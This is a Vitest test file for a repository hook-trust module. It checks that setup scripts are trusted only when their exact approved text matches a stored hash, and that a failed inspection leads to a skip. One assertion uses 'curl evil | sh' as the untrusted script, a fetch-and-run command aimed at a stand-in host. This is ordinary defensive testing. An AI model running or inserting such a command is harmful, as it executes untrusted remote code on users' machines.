import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { AppState } from '@/store/types'
import type { PersistedTrustedOrcaHooks } from '../../../shared/orca-yaml-hook-types'
import { isHookScriptContentTrusted, resolveHookTrustContent } from './hook-script-trust-content'
import { hashOrcaHookScript } from './orca-hook-trust'

const hooksCheckMock = vi.fn()
const openModal = vi.fn()

function createState(trust: PersistedTrustedOrcaHooks = {}): AppState {
  // oxlint-disable-next-line typescript/consistent-type-assertions -- SAFETY: trust resolution reads only these fields.
  return {
    trustedOrcaHooks: trust,
    repos: [{ id: 'repo-1', displayName: 'Repo One' }],
    settings: null,
    openModal
  } as unknown as AppState
}

beforeEach(() => {
  hooksCheckMock.mockReset()
  openModal.mockReset()
  vi.stubGlobal('window', { api: { hooks: { check: hooksCheckMock } } })
})

describe('resolveHookTrustContent', () => {
  it('returns the setup text still to approve, without opening the prompt', async () => {
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: 'pnpm install' } },
      mayNeedUpdate: false
    })
    const result = await resolveHookTrustContent(createState(), 'repo-1', 'setup')
    expect(result).toEqual({ kind: 'content', scriptContent: 'pnpm install' })
    expect(openModal).not.toHaveBeenCalled()
  })

  it('decides run for repo-wide trust and skip for a failed inspection', async () => {
    expect(
      await resolveHookTrustContent(
        createState({ 'repo-1': { all: { approvedAt: 1 } } }),
        'repo-1',
        'setup'
      )
    ).toEqual({ kind: 'decided', decision: 'run' })

    hooksCheckMock.mockRejectedValue(new Error('offline'))
    expect(await resolveHookTrustContent(createState(), 'repo-1', 'setup')).toEqual({
      kind: 'decided',
      decision: 'skip'
    })
  })
})

describe('isHookScriptContentTrusted', () => {
  it('trusts only the exact approved text', async () => {
    const contentHash = await hashOrcaHookScript('pnpm install')
    const state = createState({
      'repo-1': { setup: { contentHash, approvedAt: 1 } }
    })
    expect(await isHookScriptContentTrusted(state, 'repo-1', 'setup', 'pnpm install')).toBe(true)
    expect(await isHookScriptContentTrusted(state, 'repo-1', 'setup', 'curl evil | sh')).toBe(false)
    expect(openModal).not.toHaveBeenCalled()
  })
})
